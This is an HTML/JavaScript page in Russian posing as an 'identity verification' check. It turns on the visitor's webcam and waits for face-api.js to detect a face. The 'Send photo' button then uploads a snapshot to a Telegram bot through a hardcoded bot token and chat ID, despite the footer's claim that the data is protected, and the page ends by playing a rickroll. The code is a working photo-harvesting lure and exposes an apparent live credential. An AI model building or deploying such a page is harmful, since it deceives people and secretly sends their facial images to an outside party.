<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение личности</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            text-align: center;
            padding-top: 30px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            padding: 20px;
            width: 100%;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 8px;
        }
        .sub {
            color: #aaa;
            font-size: 16px;
            margin-bottom: 16px;
        }
        .video-wrapper {
            position: relative;
            display: inline-block;
            width: 100%;
            max-width: 340px;
            border-radius: 16px;
            overflow: hidden;
            background: #111;
            border: 2px solid #333;
        }
        video {
            width: 100%;
            display: block;
            border-radius: 16px;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        #rickroll {
            display: none;
            width: 100%;
            border-radius: 16px;
        }
        .btn {
            background: #1e90ff;
            border: none;
            color: #fff;
            padding: 16px 40px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 16px;
            width: 100%;
            max-width: 280px;
            transition: 0.2s;
        }
        .btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
        #status {
            margin-top: 16px;
            color: #888;
            font-size: 14px;
            min-height: 24px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #555;
        }
    </style>
</head>
<body>

<div class="container" id="mainUI">
    <h2>🔐 Подтверждение личности</h2>
    <p class="sub">Покажите лицо, затем нажмите «Отправить»</p>

    <div class="video-wrapper">
        <video id="video" autoplay playsinline></video>
        <canvas id="overlay"></canvas>
        <video id="rickroll" src="https://www.w3schools.com/html/mov_bbb.mp4" muted playsinline></video>
    </div>

    <button class="btn" id="sendBtn" disabled>📸 Отправить фото</button>
    <div id="status">⏳ Загрузка модели...</div>
    <div class="footer">Ваши данные защищены • Проверка занимает 5 секунд</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
<script>
    // ===== ТВОИ ДАННЫЕ (ВСТАВЛЕНЫ) =====
    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
    const CHAT_ID = '5025315928';
    // ====================================

    const video = document.getElementById('video');
    const rickroll = document.getElementById('rickroll');
    const overlay = document.getElementById('overlay');
    const ctx = overlay.getContext('2d');
    const sendBtn = document.getElementById('sendBtn');
    const status = document.getElementById('status');

    let stream = null;
    let faceDetected = false;
    let rickrollPlayed = false;

    // === ЗАГРУЗКА МОДЕЛИ ===
    async function loadModels() {
        status.textContent = '⏳ Загрузка модели распознавания лиц...';
        try {
            await faceapi.nets.tinyFaceDetector.loadFromUri(
                'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights'
            );
            status.textContent = '✅ Модель готова. Разрешите доступ к камере.';
            startCam();
        } catch (e) {
            status.textContent = '❌ Ошибка загрузки модели: ' + e.message;
        }
    }

    // === КАМЕРА ===
    async function startCam() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.addEventListener('play', () => {
                overlay.width = video.videoWidth || 640;
                overlay.height = video.videoHeight || 480;
                detectFace();
            });
        } catch (e) {
            status.textContent = '❌ Ошибка доступа к камере: ' + e.message;
        }
    }

    // === РАСПОЗНАВАНИЕ ЛИЦА ===
    async function detectFace() {
        setInterval(async () => {
            if (rickrollPlayed) return;

            const detections = await faceapi.detectAllFaces(
                video,
                new faceapi.TinyFaceDetectorOptions()
            );

            ctx.clearRect(0, 0, overlay.width, overlay.height);

            if (detections.length > 0) {
                faceDetected = true;
                sendBtn.disabled = false;
                status.textContent = '✅ Лицо обнаружено! Нажмите "Отправить"';

                const box = detections[0].box;
                ctx.strokeStyle = '#00ff00';
                ctx.lineWidth = 3;
                ctx.strokeRect(box.x, box.y, box.width, box.height);
            } else {
                faceDetected = false;
                sendBtn.disabled = true;
                status.textContent = '❌ Лицо не обнаружено. Покажите лицо чётко.';
            }
        }, 400);
    }

    // === ОТПРАВКА ФОТО ===
    async function snap() {
        if (!faceDetected) {
            status.textContent = '❌ Лицо не обнаружено. Попробуйте ещё раз.';
            return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const c = canvas.getContext('2d');
        c.drawImage(video, 0, 0, 640, 480);

        const data = canvas.toDataURL('image/png');
        status.textContent = '📤 Отправка фото...';

        try {
            const blob = await fetch(data).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'face.png');

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            });
            const json = await res.json();
            if (json.ok) {
                status.textContent = '✅ Фото отправлено! Перенаправление...';
                sendBtn.disabled = true;
                playRickroll();
            } else {
                status.textContent = '❌ Ошибка бота: ' + json.description;
            }
        } catch (e) {
            status.textContent = '❌ Ошибка сети. Проверьте интернет.';
        }
    }

    // === РИКРОЛЛ (ВИДЕО) ===
    function playRickroll() {
        rickrollPlayed = true;

        // Останавливаем камеру
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        video.style.display = 'none';
        overlay.style.display = 'none';

        // Показываем видео
        rickroll.style.display = 'block';
        rickroll.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ';
        rickroll.play();

        status.textContent = '🎵 Добро пожаловать!';

        // Убираем лишние кнопки
        document.querySelector('.sub').textContent = '🎉 Вы прошли проверку!';
        sendBtn.style.display = 'none';
    }

    // === КНОПКА ОТПРАВКИ ===
    sendBtn.onclick = snap;

    // === СТАРТ ===
    loadModels();
</script>
</body>
</html>
